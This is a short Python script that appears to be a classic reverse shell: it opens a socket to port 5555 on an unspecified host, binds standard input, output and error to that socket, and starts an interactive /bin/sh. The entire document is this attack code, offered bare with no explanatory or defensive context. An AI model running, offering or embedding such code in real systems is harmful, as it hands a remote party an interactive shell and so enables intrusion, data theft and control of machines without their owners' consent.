import os
import socket
import subprocess
 
client=socket.socket()
client.connect(('',5555))
 
os.dup2(client.fileno(),0)
os.dup2(client.fileno(),1)
os.dup2(client.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
